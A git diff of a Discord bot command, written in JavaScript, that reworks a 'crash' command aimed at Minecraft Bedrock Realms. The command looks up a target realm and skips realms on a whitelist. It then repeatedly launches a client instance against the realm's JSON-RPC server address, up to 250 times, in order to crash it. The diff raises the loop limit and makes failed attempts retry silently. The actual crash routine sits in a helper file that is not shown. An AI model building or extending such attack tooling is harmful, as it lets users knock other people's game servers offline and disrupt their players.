@@ -1,13 +1,18 @@
+"use strict";
+//didnt use component builder for embeds as there are too many problems when using it
+const { EmbedBuilder } = require("discord.js");
 const realmAPI = require("../../classes/Realm.js");
-const createInstance = require("../../functions/client.js")
+const createInstance = require("../../functions/client.js");
+const { isProtected } = require("../../functions/whitelist.js");
+const { getErrorMessage, errorEmbed } = require("../../functions/errors.js");
 
-let currentlyCrashing = new Map()
+let currentlyCrashing = new Map();
 
 module.exports = {
-    subCommand: "json",
+    subCommand: null,
     data: {
-        name: 'rpc',
-        description: 'A json-rpc based crash method.',
+        name: 'crash',
+        description: 'Cr@sh a realm',
 
         options: [
             {
@@ -23,38 +28,33 @@ module.exports = {
                 description: "Amount of times to loop the crash method.",
                 type: 4,
                 min_value: 1,
-                max_value: 100,
+                max_value: 250,
                 required: false
             }
         ]
     },
     global: true,
     linkOnly: true,
-    /**
-     * @param {import("discord.js").CommandInteraction} interaction
-     * @param {{ component: import("../../classes/Component.js"), dbUser: import("../../functions/Database.js").User }} param1
-     */
+
     async execute(interaction, { component, flags, dbUser }) {
         const input = interaction.options.getString('realm');
         const loop = interaction.options.getInteger('loop') || 1;
 
         if (currentlyCrashing.has(interaction.user.id)) {
-            component
-                .text(`### Something went wrong. (Crash C1)\n`, true)
-                .separator()
-                .text(`\`   You are already crashing a realm!   \``)
-
-            return interaction.reply({ components: [component], flags });
+            const embed = new EmbedBuilder()
+                .setTitle("Crash")
+                .setDescription("-# You are already crashing a realm!")
+                .setColor(0xFACC15);
+            return interaction.reply({ embeds: [embed] });
         }
 
-        component.text(
-            `### ${interaction.options?._subcommand || interaction.commandName}\n` +
-            `Please wait while crashing tests your input, this is usually a fast process.\n` +
-            `### -# Input: \`${input}\``,
-            true
-        ).separator();
+        await interaction.deferReply();
 
-        await interaction.reply({ components: [component], flags });
+        const embed = new EmbedBuilder()
+            .setTitle("Crash")
+            .setDescription(`Resolving realm...\n-# Input: \`${input}\` · Loops: \`${loop}\``)
+            .setColor(0x6C8CFF);
+        await interaction.editReply({ embeds: [embed] });
 
         try {
             const RealmAPI = new realmAPI(dbUser);
@@ -64,66 +64,79 @@ module.exports = {
                 ? await RealmAPI.getRealmInfoByID(input)
                 : await RealmAPI.getRealmInfo(input, false);
 
+            if (realm?.status && realm.status !== 200) {
+                return interaction.editReply({
+                    embeds: [errorEmbed("Crash", null, getErrorMessage({ errorMsg: `${realm.body?.errorMsg || 'Unknown'} ${realm.body?.errorCode || realm.status}` }))]
+                });
+            }
+
+            if (realm?.body?.errorMsg) {
+                return interaction.editReply({
+                    embeds: [errorEmbed("Crash", null, getErrorMessage(realm.body))]
+                });
+            }
+
+            if (realm?.body) realm = realm.body;
+
+            if (realm?.state === "CLOSED" || realm?.closed) {
+                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, "Realm is closed")] });
+            }
+
+            if (realm?.expired) {
+                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, "Realm is expired")] });
+            }
+
+            if (!realm || !realm.id) {
+                return interaction.editReply({ embeds: [errorEmbed("Crash", null, "Realm not found")] });
+            }
+
+            const alreadyProtected = await isProtected(realm.id).catch(() => false);
+            if (alreadyProtected) {
+                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, "Whitelisted")] });
+            }
+
             let check = await RealmAPI.doRealmChecks(realm, null);
             if (check?.errorMsg) {
-                component.text(`### Something went wrong. (RealmAPI C1)\n`, true)
-                    .separator()
-                    .text(`\`   ${check.errorMsg}   \``)
-
-                return interaction.editReply({ components: [component], flags });
+                return interaction.editReply({ embeds: [errorEmbed("Crash", realm, getErrorMessage(check))] });
             }
 
-            delete realm.players // fuck me this uses storage on large member based realms :sob:
+            delete realm.players;
+            currentlyCrashing.set(interaction.user.id, true);
 
-            currentlyCrashing.set(interaction.user.id, true)
-            component.text(
-                `### ${interaction.options?._subcommand || interaction.commandName}\n` +
-                `crashing has found ***${realm.name}*** (${realm.id}) and has started to attempt to loop it, once your set loop count has finished you will be informed VIA a DM from the bot.\n` +
-                `### -# Input: \`${input}\`\n` +
-                `### -# Loop Count: \`${loop}\`\n` +
-                `### -# Estimated Time: <t:${Math.floor(Date.now() / 1000) + (loop * 12.5)}:R>\n` +
-                `# -# This crash is a hit and noHit, it could work but may take time.`,
-                true
-            ).separator();
-            await interaction.editReply({ components: [component], flags });
+            const runningEmbed = new EmbedBuilder()
+                .setTitle("Crash")
+                .setDescription(`**${realm.name}** · \`${realm.id}\`\n-# Running \`${loop}\` loops...`)
+                .setColor(0x4ADE80);
+            await interaction.editReply({ embeds: [runningEmbed] });
 
-            for (let i = 0; i < loop; i++) { // 15 loops = 1 minute and 52.5 seconds (15 * 12.5 seconds = 187.5 seconds)
+            for (let i = 0; i < loop; i++) {
                 const host = await RealmAPI.getRealmIP(realm.id);
                 check = await RealmAPI.doRealmChecks(null, host);
-                if (check?.errorMsg) {
-                    component.text(`### Something went wrong. (RealmAPI C2)\n`, true)
-                        .separator()
-                        .text(`\`   ${check.errorMsg}   \``)
-
-                    return interaction.user.send({ components: [component], flags }).catch(() => { });
-                }
-
-                if (host.body?.networkProtocol !== "NETHERNET_JSONRPC") {
-                    component.text(`### Something went wrong. (RealmAPI C3)\n`, true)
-                        .separator()
-                        .text(`\`   ${host.body?.networkProtocol} is not a supported protocol for this method!   \``)
-
-                    return interaction.user.send({ components: [component], flags }).catch(() => { });
-                }
+                if (check?.errorMsg) continue;
+                if (host?.body?.networkProtocol !== "NETHERNET_JSONRPC") continue;
 
                 await createInstance(realm, dbUser, {
-                    protocol: host.body?.networkProtocol,
-                    address: host.body?.address,
+                    protocol: host.body.networkProtocol,
+                    address: host.body.address,
                     external: { enabled: true, type: 3 }
-                }, RealmAPI.api)
+                }, RealmAPI);
 
-                await new Promise(resolve => setTimeout(resolve, 12500)) // wait 12.5 seconds between each crash
+                await new Promise(resolve => setTimeout(resolve, 15000));
             }
+
+            currentlyCrashing.delete(interaction.user.id);
+
+            const doneEmbed = new EmbedBuilder()
+                .setTitle("Crash")
+                .setDescription(`**${realm.name}** · \`${realm.id}\`\n-# Completed \`${loop}\` loops ✅`)
+                .setColor(0x4ADE80);
+            return interaction.editReply({ embeds: [doneEmbed] }).catch(() => {});
+
         } catch (error) {
             console.error(error);
-        } finally {
-            currentlyCrashing.delete(interaction.user.id)
-
-            component.text(`### Success!\n`, true)
-                .separator()
-                .text(`crashing has finished your requested loops ***\`[${loop}]\`*** on ***${realm.name}*** (${realm.id}).`)
-
-            return interaction.user.send({ components: [component], flags }).catch(() => { });
+            currentlyCrashing.delete(interaction.user.id);
         }
     }
-}
+};
+
+module.exports.currentlyCrashing = currentlyCrashing;
